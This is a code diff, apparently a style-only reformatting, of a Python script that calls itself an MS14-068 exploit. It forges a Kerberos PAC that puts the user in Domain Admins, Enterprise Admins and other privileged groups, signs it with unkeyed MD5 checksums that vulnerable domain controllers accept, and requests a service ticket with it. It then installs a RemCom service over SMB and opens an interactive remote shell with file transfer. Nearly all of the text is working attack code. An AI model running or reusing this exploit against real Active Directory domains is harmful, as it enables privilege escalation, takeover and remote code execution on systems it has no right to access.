@@ -8,13 +8,13 @@
 # Author: Alberto Solino (@agsolino)
 #
 # Description:
-#   MS14-068 Exploit. Kudos to @BiDOrD for pulling it up first! 
+#   MS14-068 Exploit. Kudos to @BiDOrD for pulling it up first!
 #   Well done :).
-#   This one also established a SMBConnection and PSEXEcs the 
+#   This one also established a SMBConnection and PSEXEcs the
 #   target.
 #   A few important things:
 #   1) you must use the domain FQDN or use -dc-ip switch
-#   2) target must be a FQDN as well and matching the target's NetBIOS 
+#   2) target must be a FQDN as well and matching the target's NetBIOS
 #   3) Just RC4 at the moment - DONE (aes256 added)
 #   4) It won't work on Kerberos-only Domains (but can be fixed)
 #   5) Use WMIEXEC approach instead
@@ -81,31 +81,36 @@ from Crypto.Hash import MD5
 # HELPER FUNCTIONS
 ################################################################################
 
+
 class RemComMessage(Structure):
     structure = (
-        ('Command','4096s=""'),
-        ('WorkingDir','260s=""'),
-        ('Priority','<L=0x20'),
-        ('ProcessID','<L=0x01'),
-        ('Machine','260s=""'),
-        ('NoWait','<L=0'),
+        ('Command', '4096s=""'),
+        ('WorkingDir', '260s=""'),
+        ('Priority', '<L=0x20'),
+        ('ProcessID', '<L=0x01'),
+        ('Machine', '260s=""'),
+        ('NoWait', '<L=0'),
     )
+
 
 class RemComResponse(Structure):
     structure = (
-        ('ErrorCode','<L=0'),
-        ('ReturnCode','<L=0'),
+        ('ErrorCode', '<L=0'),
+        ('ReturnCode', '<L=0'),
     )
 
-RemComSTDOUT         = "RemCom_stdout"
-RemComSTDIN          = "RemCom_stdin"
-RemComSTDERR         = "RemCom_stderr"
+
+RemComSTDOUT = "RemCom_stdout"
+RemComSTDIN = "RemCom_stdin"
+RemComSTDERR = "RemCom_stderr"
 
 lock = Lock()
-totalOutput=""
+totalOutput = ""
+
 
 class PSEXEC1:
-    def __init__(self, command, username, domain, smbConnection, TGS, copyFile):
+    def __init__(self, command, username, domain, smbConnection, TGS,
+                 copyFile):
         self.__username = username
         self.__command = command
         self.__path = None
@@ -114,9 +119,10 @@ class PSEXEC1:
         self.__copyFile = copyFile
         self.__TGS = TGS
         self.__smbConnection = smbConnection
-	
+
     def run(self, addr):
-        rpctransport = transport.SMBTransport(addr, filename='/svcctl', smb_connection=self.__smbConnection)
+        rpctransport = transport.SMBTransport(
+            addr, filename='/svcctl', smb_connection=self.__smbConnection)
         dce = rpctransport.get_dce_rpc()
         try:
             dce.connect()
@@ -134,15 +140,17 @@ class PSEXEC1:
             # We don't wanna deal with timeouts from now on.
             s.setTimeout(100000)
             if self.__exeFile is None:
-                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), remcomsvc.RemComSvc())
+                installService = serviceinstall.ServiceInstall(
+                    rpctransport.get_smb_connection(), remcomsvc.RemComSvc())
             else:
                 try:
                     f = open(self.__exeFile)
                 except Exception, e:
                     logging.critical(str(e))
                     sys.exit(1)
-                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f)
-    
+                installService = serviceinstall.ServiceInstall(
+                    rpctransport.get_smb_connection(), f)
+
             installService.install()
 
             if self.__exeFile is not None:
@@ -150,17 +158,21 @@ class PSEXEC1:
 
             # Check if we need to copy a file for execution
             if self.__copyFile is not None:
-                installService.copy_file(self.__copyFile, installService.getShare(), os.path.basename(self.__copyFile))
+                installService.copy_file(self.__copyFile,
+                                         installService.getShare(),
+                                         os.path.basename(self.__copyFile))
                 # And we change the command to be executed to this filename
-                self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command
+                self.__command = os.path.basename(
+                    self.__copyFile) + ' ' + self.__command
 
             tid = s.connectTree('IPC$')
-            fid_main = self.openPipe(s,tid,'\RemCom_communicaton',0x12019f)
+            fid_main = self.openPipe(s, tid, '\RemCom_communicaton', 0x12019f)
 
             packet = RemComMessage()
             pid = os.getpid()
 
-            packet['Machine'] = ''.join([random.choice(string.letters) for _ in range(4)])
+            packet['Machine'] = ''.join(
+                [random.choice(string.letters) for _ in range(4)])
             if self.__path is not None:
                 packet['WorkingDir'] = self.__path
             packet['Command'] = self.__command
@@ -174,34 +186,40 @@ class PSEXEC1:
             LastDataSent = ''
 
             # Create the pipes threads
-            stdin_pipe = RemoteStdInPipe(rpctransport,
-                                         '\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
-                                         smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS,
-                                         installService.getShare())
+            stdin_pipe = RemoteStdInPipe(
+                rpctransport, '\%s%s%d' %
+                (RemComSTDIN, packet['Machine'], packet['ProcessID']),
+                smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS,
+                installService.getShare())
             stdin_pipe.start()
-            stdout_pipe = RemoteStdOutPipe(rpctransport,
-                                           '\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
-                                           smb.FILE_READ_DATA)
+            stdout_pipe = RemoteStdOutPipe(
+                rpctransport, '\%s%s%d' %
+                (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
+                smb.FILE_READ_DATA)
             stdout_pipe.start()
-            stderr_pipe = RemoteStdErrPipe(rpctransport,
-                                           '\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
-                                           smb.FILE_READ_DATA)
+            stderr_pipe = RemoteStdErrPipe(
+                rpctransport, '\%s%s%d' %
+                (RemComSTDERR, packet['Machine'], packet['ProcessID']),
+                smb.FILE_READ_DATA)
             stderr_pipe.start()
-            
+
             # And we stay here till the end
-	    time.sleep(10)
-	    print "\nPress the [enter] key"
-            ans = s.readNamedPipe(tid,fid_main,4)
+            time.sleep(10)
+            print "\nPress the [enter] key"
+            ans = s.readNamedPipe(tid, fid_main, 4)
             #ans = s.readNamedPipe(tid,fid_main,8)
             if len(ans):
                 retCode = RemComResponse(ans)
-	    	 #print getOutput()
-                logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (
-                self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
+                #print getOutput()
+                logging.info(
+                    "Process %s finished with ErrorCode: %d, ReturnCode: %d" %
+                    (self.__command, retCode['ErrorCode'],
+                     retCode['ReturnCode']))
             installService.uninstall()
             if self.__copyFile is not None:
                 # We copied a file for execution, let's remove it
-                s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
+                s.deleteFile(installService.getShare(),
+                             os.path.basename(self.__copyFile))
             unInstalled = True
             #sys.exit(retCode['ErrorCode'])
 
@@ -211,7 +229,8 @@ class PSEXEC1:
             if unInstalled is False:
                 installService.uninstall()
                 if self.__copyFile is not None:
-                    s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
+                    s.deleteFile(installService.getShare(),
+                                 os.path.basename(self.__copyFile))
             sys.stdout.flush()
             #sys.exit(1)
 
@@ -220,7 +239,7 @@ class PSEXEC1:
         tries = 50
         while pipeReady is False and tries > 0:
             try:
-                s.waitNamedPipe(tid,pipe)
+                s.waitNamedPipe(tid, pipe)
                 pipeReady = True
             except:
                 tries -= 1
@@ -231,9 +250,14 @@ class PSEXEC1:
             logging.critical('Pipe not ready, aborting')
             raise
 
-        fid = s.openFile(tid,pipe,accessMask, creationOption = 0x40, fileAttributes = 0x80)
+        fid = s.openFile(tid,
+                         pipe,
+                         accessMask,
+                         creationOption=0x40,
+                         fileAttributes=0x80)
 
         return fid
+
 
 class Pipes(Thread):
     def __init__(self, transport, pipe, permissions, TGS=None, share=None):
@@ -254,18 +278,27 @@ class Pipes(Thread):
         try:
             lock.acquire()
             global dialect
-            self.server = SMBConnection2('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(),
-                                        sess_port=self.port, preferredDialect=dialect)
+            self.server = SMBConnection2(
+                '*SMBSERVER',
+                self.transport.get_smb_connection().getRemoteHost(),
+                sess_port=self.port,
+                preferredDialect=dialect)
             user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
             self.server.login(user, passwd, domain, lm, nt)
             lock.release()
-            self.tid = self.server.connectTree('IPC$') 
+            self.tid = self.server.connectTree('IPC$')
 
             self.server.waitNamedPipe(self.tid, self.pipe)
-            self.fid = self.server.openFile(self.tid,self.pipe,self.permissions, creationOption = 0x40, fileAttributes = 0x80)
+            self.fid = self.server.openFile(self.tid,
+                                            self.pipe,
+                                            self.permissions,
+                                            creationOption=0x40,
+                                            fileAttributes=0x80)
             self.server.setTimeout(1000000)
         except:
-            logging.critical("Something wen't wrong connecting the pipes(%s), try again" % self.__class__)
+            logging.critical(
+                "Something wen't wrong connecting the pipes(%s), try again" %
+                self.__class__)
 
 
 class RemoteStdOutPipe(Pipes):
@@ -273,29 +306,30 @@ class RemoteStdOutPipe(Pipes):
         Pipes.__init__(self, transport, pipe, permisssions)
 
     def run(self):
-	global totalOutput
+        global totalOutput
         self.connectPipe()
         while True:
             try:
-                ans = self.server.readFile(self.tid,self.fid, 0, 1024)
+                ans = self.server.readFile(self.tid, self.fid, 0, 1024)
             except:
                 pass
             else:
                 try:
-                        global LastDataSent
-                        if ans != LastDataSent:
-			    totalOutput+=ans
-                            #sys.stdout.write(ans)
-                            #sys.stdout.flush()
-                        else:
-                            # Don't echo what I sent, and clear it up
-                            LastDataSent = ''
-                        # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars, 
-                        # it will give false positives tho.. we should find a better way to handle this.
-                        if LastDataSent > 10:
-                            LastDataSent = ''
+                    global LastDataSent
+                    if ans != LastDataSent:
+                        totalOutput += ans
+                    #sys.stdout.write(ans)
+                    #sys.stdout.flush()
+                    else:
+                        # Don't echo what I sent, and clear it up
+                        LastDataSent = ''
+                    # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars,
+                    # it will give false positives tho.. we should find a better way to handle this.
+                    if LastDataSent > 10:
+                        LastDataSent = ''
                 except:
                     pass
+
 
 class RemoteStdErrPipe(Pipes):
     def __init__(self, transport, pipe, permisssions):
@@ -305,7 +339,7 @@ class RemoteStdErrPipe(Pipes):
         self.connectPipe()
         while True:
             try:
-                ans = self.server.readFile(self.tid,self.fid, 0, 1024)
+                ans = self.server.readFile(self.tid, self.fid, 0, 1024)
             except:
                 pass
             else:
@@ -314,6 +348,7 @@ class RemoteStdErrPipe(Pipes):
                     sys.stderr.flush()
                 except:
                     pass
+
 
 class RemoteShell(cmd.Cmd):
     def __init__(self, server, port, credentials, tid, fid, TGS, share):
@@ -328,14 +363,26 @@ class RemoteShell(cmd.Cmd):
         self.port = port
         self.TGS = TGS
         self.intro = ''
-	#[!] Press help for extra shell commands'
-    #def postloop(self):
-    #	return
+
+
+#[!] Press help for extra shell commands'
+#def postloop(self):
+#	return
+
     def connect_transferClient(self):
-        self.transferClient = SMBConnection2('*SMBSERVER', self.server.getRemoteHost(), sess_port=self.port,
-                                            preferredDialect=dialect)
+        self.transferClient = SMBConnection2('*SMBSERVER',
+                                             self.server.getRemoteHost(),
+                                             sess_port=self.port,
+                                             preferredDialect=dialect)
         user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
-        self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)
+        self.transferClient.kerberosLogin(user,
+                                          passwd,
+                                          domain,
+                                          lm,
+                                          nt,
+                                          aesKey,
+                                          TGS=self.TGS,
+                                          useCache=False)
 
     def do_help(self, line):
         print """
@@ -350,7 +397,7 @@ class RemoteShell(cmd.Cmd):
     def do_shell(self, s):
         os.system(s)
         self.send_data('\r\n')
-	return
+        return
 
     def do_get(self, src_path):
         try:
@@ -359,7 +406,7 @@ class RemoteShell(cmd.Cmd):
 
             import ntpath
             filename = ntpath.basename(src_path)
-            fh = open(filename,'wb')
+            fh = open(filename, 'wb')
             logging.info("Downloading %s\%s" % (self.share, src_path))
             self.transferClient.getFile(self.share, src_path, fh.write)
             fh.close()
@@ -368,7 +415,7 @@ class RemoteShell(cmd.Cmd):
             pass
 
         self.send_data('\r\n')
- 
+
     def do_put(self, s):
         try:
             if self.transferClient is None:
@@ -384,8 +431,9 @@ class RemoteShell(cmd.Cmd):
             src_file = os.path.basename(src_path)
             fh = open(src_path, 'rb')
             f = dst_path + '/' + src_file
-            pathname = string.replace(f,'/','\\')
-            logging.info("Uploading %s to %s\%s" % (src_file, self.share, dst_path))
+            pathname = string.replace(f, '/', '\\')
+            logging.info("Uploading %s to %s\%s" %
+                         (src_file, self.share, dst_path))
             self.transferClient.putFile(self.share, pathname, fh.read)
             fh.close()
         except Exception, e:
@@ -393,7 +441,6 @@ class RemoteShell(cmd.Cmd):
             pass
 
         self.send_data('\r\n')
-
 
     def do_lcd(self, s):
         if s == '':
@@ -410,20 +457,21 @@ class RemoteShell(cmd.Cmd):
         return
 
     def default(self, line):
-        self.send_data(line+'\r\n')
-	return True
+        self.send_data(line + '\r\n')
+        return True
 
-    def send_data(self, data, hideOutput = True):
+    def send_data(self, data, hideOutput=True):
         if hideOutput is True:
             global LastDataSent
             LastDataSent = data
         else:
             LastDataSent = ''
         try:
-	        self.server.writeFile(self.tid, self.fid, data)
-	except:
-		pass
-	return
+            self.server.writeFile(self.tid, self.fid, data)
+        except:
+            pass
+        return
+
 
 class RemoteStdInPipe(Pipes):
     def __init__(self, transport, pipe, permisssions, TGS=None, share=None):
@@ -431,23 +479,32 @@ class RemoteStdInPipe(Pipes):
 
     def run(self):
         self.connectPipe()
-        shell = RemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.TGS, self.share)
+        shell = RemoteShell(self.server, self.port, self.credentials, self.tid,
+                            self.fid, self.TGS, self.share)
         shell.cmdloop()
 
 
 class MS14_068:
     # 6.1.  Unkeyed Checksums
     # Vulnerable DCs are accepting at least these unkeyed checksum types
-    CRC_32  = 1
+    CRC_32 = 1
     RSA_MD4 = 2
     RSA_MD5 = 7
-    class VALIDATION_INFO(TypeSerialization1):
-        structure = (
-            ('Data', PKERB_VALIDATION_INFO),
-        )
 
-    def __init__(self, target, targetIp=None, username='', password='', domain='', hashes=None, command='',
-                 copyFile=None, writeTGT=None, kdcHost=None):
+    class VALIDATION_INFO(TypeSerialization1):
+        structure = (('Data', PKERB_VALIDATION_INFO), )
+
+    def __init__(self,
+                 target,
+                 targetIp=None,
+                 username='',
+                 password='',
+                 domain='',
+                 hashes=None,
+                 command='',
+                 copyFile=None,
+                 writeTGT=None,
+                 kdcHost=None):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -465,7 +522,7 @@ class MS14_068:
         self.__domainControllers = list()
         self.__kdcHost = kdcHost
 
-	hashes=None
+        hashes = None
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
             self.__lmhash = unhexlify(self.__lmhash)
@@ -481,112 +538,118 @@ class MS14_068:
 
         kerbdata = KERB_VALIDATION_INFO()
 
-        kerbdata['LogonTime']['dwLowDateTime']           = unixTime & 0xffffffff
-        kerbdata['LogonTime']['dwHighDateTime']          = unixTime >>32
+        kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
+        kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32
 
-        # LogoffTime: A FILETIME structure that contains the time the client's logon 
-        # session should expire. If the session should not expire, this structure 
-        # SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime 
-        # member set to 0xFFFFFFFF. A recipient of the PAC SHOULD<7> use this value as 
+        # LogoffTime: A FILETIME structure that contains the time the client's logon
+        # session should expire. If the session should not expire, this structure
+        # SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime
+        # member set to 0xFFFFFFFF. A recipient of the PAC SHOULD<7> use this value as
         # an indicator of when to warn the user that the allowed time is due to expire.
-        kerbdata['LogoffTime']['dwLowDateTime']          = 0xFFFFFFFF
-        kerbdata['LogoffTime']['dwHighDateTime']         = 0x7FFFFFFF
+        kerbdata['LogoffTime']['dwLowDateTime'] = 0xFFFFFFFF
+        kerbdata['LogoffTime']['dwHighDateTime'] = 0x7FFFFFFF
 
-        # KickOffTime: A FILETIME structure that contains LogoffTime minus the user 
-        # account's forceLogoff attribute ([MS-ADA1] section 2.233) value. If the 
-        # client should not be logged off, this structure SHOULD have the dwHighDateTime 
-        # member set to 0x7FFFFFFF and the dwLowDateTime member set to 0xFFFFFFFF. 
-        # The Kerberos service ticket end time is a replacement for KickOffTime. 
-        # The service ticket lifetime SHOULD NOT be set longer than the KickOffTime of 
-        # an account. A recipient of the PAC SHOULD<8> use this value as the indicator 
+        # KickOffTime: A FILETIME structure that contains LogoffTime minus the user
+        # account's forceLogoff attribute ([MS-ADA1] section 2.233) value. If the
+        # client should not be logged off, this structure SHOULD have the dwHighDateTime
+        # member set to 0x7FFFFFFF and the dwLowDateTime member set to 0xFFFFFFFF.
+        # The Kerberos service ticket end time is a replacement for KickOffTime.
+        # The service ticket lifetime SHOULD NOT be set longer than the KickOffTime of
+        # an account. A recipient of the PAC SHOULD<8> use this value as the indicator
         # of when the client should be forcibly disconnected.
-        kerbdata['KickOffTime']['dwLowDateTime']         = 0xFFFFFFFF
-        kerbdata['KickOffTime']['dwHighDateTime']        = 0x7FFFFFFF
+        kerbdata['KickOffTime']['dwLowDateTime'] = 0xFFFFFFFF
+        kerbdata['KickOffTime']['dwHighDateTime'] = 0x7FFFFFFF
 
-        kerbdata['PasswordLastSet']['dwLowDateTime']     = 0
-        kerbdata['PasswordLastSet']['dwHighDateTime']    = 0
+        kerbdata['PasswordLastSet']['dwLowDateTime'] = 0
+        kerbdata['PasswordLastSet']['dwHighDateTime'] = 0
 
-        kerbdata['PasswordCanChange']['dwLowDateTime']   = 0
-        kerbdata['PasswordCanChange']['dwHighDateTime']  = 0
-        
+        kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
+        kerbdata['PasswordCanChange']['dwHighDateTime'] = 0
+
         # PasswordMustChange: A FILETIME structure that contains the time at which
-        # theclient's password expires. If the password will not expire, this 
-        # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the 
+        # theclient's password expires. If the password will not expire, this
+        # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the
         # dwLowDateTime member set to 0xFFFFFFFF.
-        kerbdata['PasswordMustChange']['dwLowDateTime']  = 0xFFFFFFFF
+        kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
         kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF
 
-        kerbdata['EffectiveName']      = self.__username
-        kerbdata['FullName']           = ''
-        kerbdata['LogonScript']        = ''
-        kerbdata['ProfilePath']        = ''
-        kerbdata['HomeDirectory']      = ''
+        kerbdata['EffectiveName'] = self.__username
+        kerbdata['FullName'] = ''
+        kerbdata['LogonScript'] = ''
+        kerbdata['ProfilePath'] = ''
+        kerbdata['HomeDirectory'] = ''
         kerbdata['HomeDirectoryDrive'] = ''
-        kerbdata['LogonCount']         = 0
-        kerbdata['BadPasswordCount']   = 0
-        kerbdata['UserId']             = self.__rid
-        kerbdata['PrimaryGroupId']     = 513
-        
+        kerbdata['LogonCount'] = 0
+        kerbdata['BadPasswordCount'] = 0
+        kerbdata['UserId'] = self.__rid
+        kerbdata['PrimaryGroupId'] = 513
+
         # Our Golden Well-known groups! :)
         groups = (513, 512, 520, 518, 519)
-        kerbdata['GroupCount']         = len(groups)
+        kerbdata['GroupCount'] = len(groups)
 
         for group in groups:
             groupMembership = GROUP_MEMBERSHIP()
             groupId = NDRULONG()
             groupId['Data'] = group
             groupMembership['RelativeId'] = groupId
-            groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
+            groupMembership[
+                'Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
             kerbdata['GroupIds'].append(groupMembership)
 
-        kerbdata['UserFlags']         = 0
-        kerbdata['UserSessionKey']    = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-        kerbdata['LogonServer']       = ''
-        kerbdata['LogonDomainName']   = self.__domain
-        kerbdata['LogonDomainId']     = self.__domainSid
-        kerbdata['LMKey']             = '\x00\x00\x00\x00\x00\x00\x00\x00'
-        kerbdata['UserAccountControl']= USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
-        kerbdata['SubAuthStatus']     = 0
-        kerbdata['LastSuccessfulILogon']['dwLowDateTime']  = 0
+        kerbdata['UserFlags'] = 0
+        kerbdata[
+            'UserSessionKey'] = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+        kerbdata['LogonServer'] = ''
+        kerbdata['LogonDomainName'] = self.__domain
+        kerbdata['LogonDomainId'] = self.__domainSid
+        kerbdata['LMKey'] = '\x00\x00\x00\x00\x00\x00\x00\x00'
+        kerbdata[
+            'UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
+        kerbdata['SubAuthStatus'] = 0
+        kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
         kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
-        kerbdata['LastFailedILogon']['dwLowDateTime']      = 0
-        kerbdata['LastFailedILogon']['dwHighDateTime']     = 0
+        kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
+        kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
         kerbdata['FailedILogonCount'] = 0
-        kerbdata['Reserved3']         = 0
+        kerbdata['Reserved3'] = 0
 
-        # AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY: A SID that means the client's identity is 
+        # AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY: A SID that means the client's identity is
         # asserted by an authentication authority based on proof of possession of client credentials.
         #extraSids = ('S-1-18-1',)
         if self.__forestSid is not None:
-            extraSids = ('%s-%s' % (self.__forestSid, '519'),)
-            kerbdata['SidCount']          = len(extraSids)
+            extraSids = ('%s-%s' % (self.__forestSid, '519'), )
+            kerbdata['SidCount'] = len(extraSids)
             kerbdata['UserFlags'] |= 0x20
         else:
             extraSids = ()
-            kerbdata['SidCount']          = len(extraSids)
-        
+            kerbdata['SidCount'] = len(extraSids)
+
         for extraSid in extraSids:
             sidRecord = KERB_SID_AND_ATTRIBUTES()
             sid = RPC_SID()
             sid.fromCanonical(extraSid)
             sidRecord['Sid'] = sid
-            sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
+            sidRecord[
+                'Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
             kerbdata['ExtraSids'].append(sidRecord)
 
         kerbdata['ResourceGroupDomainSid'] = NULL
         kerbdata['ResourceGroupCount'] = 0
         kerbdata['ResourceGroupIds'] = NULL
-            
+
         validationInfo = self.VALIDATION_INFO()
         validationInfo['Data'] = kerbdata
 
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('VALIDATION_INFO')
             validationInfo.dump()
-            print ('\n')
+            print('\n')
 
-        validationInfoBlob = validationInfo.getData()+validationInfo.getDataReferents()
-        validationInfoAlignment = '\x00'*(((len(validationInfoBlob)+7)/8*8)-len(validationInfoBlob))
+        validationInfoBlob = validationInfo.getData(
+        ) + validationInfo.getDataReferents()
+        validationInfoAlignment = '\x00' * ((
+            (len(validationInfoBlob) + 7) / 8 * 8) - len(validationInfoBlob))
 
         # 2) PAC_CLIENT_INFO
         pacClientInfo = PAC_CLIENT_INFO()
@@ -595,11 +658,13 @@ class MS14_068:
             name = self.__username.encode('utf-16le')
         except UnicodeDecodeError:
             import sys
-            name = self.__username.decode(sys.getfilesystemencoding()).encode('utf-16le')
+            name = self.__username.decode(
+                sys.getfilesystemencoding()).encode('utf-16le')
         pacClientInfo['NameLength'] = len(name)
         pacClientInfo['Name'] = name
         pacClientInfoBlob = str(pacClientInfo)
-        pacClientInfoAlignment = '\x00'*(((len(pacClientInfoBlob)+7)/8*8)-len(pacClientInfoBlob))
+        pacClientInfoAlignment = '\x00' * ((
+            (len(pacClientInfoBlob) + 7) / 8 * 8) - len(pacClientInfoBlob))
 
         # 3) PAC_SERVER_CHECKSUM/PAC_SIGNATURE_DATA
         serverChecksum = PAC_SIGNATURE_DATA()
@@ -614,10 +679,11 @@ class MS14_068:
 
         # If you wanna do MD5, uncomment this
         serverChecksum['SignatureType'] = self.RSA_MD5
-        serverChecksum['Signature'] = '\x00'*16
+        serverChecksum['Signature'] = '\x00' * 16
 
         serverChecksumBlob = str(serverChecksum)
-        serverChecksumAlignment = '\x00'*(((len(serverChecksumBlob)+7)/8*8)-len(serverChecksumBlob))
+        serverChecksumAlignment = '\x00' * ((
+            (len(serverChecksumBlob) + 7) / 8 * 8) - len(serverChecksumBlob))
 
         # 4) PAC_PRIVSVR_CHECKSUM/PAC_SIGNATURE_DATA
         privSvrChecksum = PAC_SIGNATURE_DATA()
@@ -632,33 +698,36 @@ class MS14_068:
 
         # If you wanna do MD5, uncomment this
         privSvrChecksum['SignatureType'] = self.RSA_MD5
-        privSvrChecksum['Signature'] = '\x00'*16
+        privSvrChecksum['Signature'] = '\x00' * 16
 
         privSvrChecksumBlob = str(privSvrChecksum)
-        privSvrChecksumAlignment = '\x00'*(((len(privSvrChecksumBlob)+7)/8*8)-len(privSvrChecksumBlob))
+        privSvrChecksumAlignment = '\x00' * ((
+            (len(privSvrChecksumBlob) + 7) / 8 * 8) - len(privSvrChecksumBlob))
 
         # The offset are set from the beginning of the PAC_TYPE
         # [MS-PAC] 2.4 PAC_INFO_BUFFER
-        offsetData = 8 + len(str(PAC_INFO_BUFFER()))*4
+        offsetData = 8 + len(str(PAC_INFO_BUFFER())) * 4
 
         # Let's build the PAC_INFO_BUFFER for each one of the elements
         validationInfoIB = PAC_INFO_BUFFER()
         validationInfoIB['ulType'] = PAC_LOGON_INFO
-        validationInfoIB['cbBufferSize'] =  len(validationInfoBlob)
+        validationInfoIB['cbBufferSize'] = len(validationInfoBlob)
         validationInfoIB['Offset'] = offsetData
-        offsetData = (offsetData+validationInfoIB['cbBufferSize'] + 7) /8 *8
+        offsetData = (offsetData + validationInfoIB['cbBufferSize'] +
+                      7) / 8 * 8
 
         pacClientInfoIB = PAC_INFO_BUFFER()
         pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
         pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
         pacClientInfoIB['Offset'] = offsetData
-        offsetData = (offsetData+pacClientInfoIB['cbBufferSize'] + 7) /8 *8
+        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] + 7) / 8 * 8
 
         serverChecksumIB = PAC_INFO_BUFFER()
         serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
         serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
         serverChecksumIB['Offset'] = offsetData
-        offsetData = (offsetData+serverChecksumIB['cbBufferSize'] + 7) /8 *8
+        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] +
+                      7) / 8 * 8
 
         privSvrChecksumIB = PAC_INFO_BUFFER()
         privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
@@ -667,10 +736,13 @@ class MS14_068:
         #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
 
         # Building the PAC_TYPE as specified in [MS-PAC]
-        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(
-            privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(
-            pacClientInfo) + pacClientInfoAlignment
-        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
+        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(
+            serverChecksumIB) + str(
+                privSvrChecksumIB
+            ) + validationInfoBlob + validationInfoAlignment + str(
+                pacClientInfo) + pacClientInfoAlignment
+        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(
+            privSvrChecksum) + privSvrChecksumAlignment
 
         pacType = PACTYPE()
         pacType['cBuffers'] = 4
@@ -689,22 +761,26 @@ class MS14_068:
 
         # If you want to do MD5, ucomment this
         serverChecksum['Signature'] = MD5.new(blobToChecksum).digest()
-        privSvrChecksum['Signature'] = MD5.new(serverChecksum['Signature']).digest() 
+        privSvrChecksum['Signature'] = MD5.new(
+            serverChecksum['Signature']).digest()
 
-        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
+        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(
+            privSvrChecksum) + privSvrChecksumAlignment
         pacType['Buffers'] = buffers + buffersTail
 
         authorizationData = AuthorizationData()
         authorizationData[0] = None
-        authorizationData[0]['ad-type'] = int(constants.AuthorizationDataType.AD_WIN2K_PAC.value)
+        authorizationData[0]['ad-type'] = int(
+            constants.AuthorizationDataType.AD_WIN2K_PAC.value)
         authorizationData[0]['ad-data'] = str(pacType)
         return encoder.encode(authorizationData)
 
-    def getKerberosTGS(self, serverName, domain, kdcHost, tgt, cipher, sessionKey, authTime):
+    def getKerberosTGS(self, serverName, domain, kdcHost, tgt, cipher,
+                       sessionKey, authTime):
         # Get out Golden PAC
         goldenPAC = self.getGoldenPAC(authTime)
 
-        decodedTGT = decoder.decode(tgt, asn1Spec = AS_REP())[0]
+        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
 
         # Extract the ticket from the TGT
         ticket = Ticket()
@@ -713,7 +789,8 @@ class MS14_068:
         # Now put the goldenPac inside the AuthorizationData AD_IF_RELEVANT
         ifRelevant = AD_IF_RELEVANT()
         ifRelevant[0] = None
-        ifRelevant[0]['ad-type'] = int(constants.AuthorizationDataType.AD_IF_RELEVANT.value)
+        ifRelevant[0]['ad-type'] = int(
+            constants.AuthorizationDataType.AD_IF_RELEVANT.value)
